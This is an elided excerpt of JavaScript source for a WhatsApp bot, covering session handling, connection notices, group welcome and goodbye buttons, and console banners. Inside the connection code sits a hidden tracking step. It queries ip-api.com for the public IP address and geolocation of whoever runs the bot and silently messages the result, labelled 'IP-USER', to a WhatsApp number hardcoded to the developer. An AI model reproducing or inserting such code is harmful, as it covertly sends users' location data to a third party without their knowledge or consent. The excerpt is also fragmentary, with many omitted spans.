...
denz.autoReconnect = ReconnectMode.onConnectionLost
    ...
    fs.existsSync('./Ammu session.json') && denz.loadAuthInfo('./Ammu session.json')
  ...
  fs.writeFileSync("./Ammu session.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `Hi`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 ${settings.NamaBot}, 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 L o r d ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Ammukutty.jpg'),sourceUrl:"https://wa.me/919656459062?text=Hi bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("919656459062@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer DEVILSER",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Ammukutty.jpg'),sourceUrl:"https://wa.me/919656459062?text=Hi bro"}}})
...
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./Ammukutty.jpg'),
        "contextInfo": {
            mentionedJid: [num]},
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${masuk}`, `${uwu}L O R D 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
...
denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
        ...
        caption: 'Tes',
            quoted: fkontakk})
            //sendButLocation(mdata.id, `${keluar}`, `${uwu}𝙻𝙾𝚁𝙳 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
...
➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - 𝑳𝑶𝑹𝑫⇥𝑺𝑬𝑹ꕥ\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('DEVILSER bot v1', 'cyan'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping(' Created By DEVILSER' ,{ flashStyle: term.brightWhite })
